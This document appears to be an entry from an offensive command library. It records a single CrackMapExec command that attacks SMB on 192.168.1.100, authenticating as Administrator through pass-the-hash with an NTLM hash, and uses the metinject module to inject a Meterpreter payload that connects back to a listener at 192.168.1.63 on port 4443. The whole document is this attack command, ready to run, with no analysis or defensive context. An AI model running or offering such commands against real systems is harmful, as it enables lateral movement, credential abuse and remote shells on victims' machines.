---
id: 2b1e1056-2e77-40e4-995f-01d6e0ae2545
name: Execute smb module with metinject module and LHOST/LPORT options
type: command
executor: bash
data: root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f
  -M metinject -o LHOST=192.168.1.63 LPORT=4443
output: null
created_at: '2023-04-06T03:56:01.851552+00:00'
updated_at: '2023-04-10T20:25:48.419627+00:00'
---

# Execute smb module with metinject module and LHOST/LPORT options

```bash
root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
```
